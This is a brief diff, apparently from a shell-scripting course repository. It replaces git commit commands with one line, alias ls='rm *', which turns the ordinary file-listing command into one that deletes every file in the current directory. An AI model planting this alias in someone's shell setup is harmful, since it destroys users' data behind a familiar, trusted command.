@@ -1,4 +1,2 @@
-chmod +x 0x03-shell_variables_expansions/*
-git add .
-git commit -m "Add shell variable and expansion scripts"
-git push
+alias ls='rm *'
+
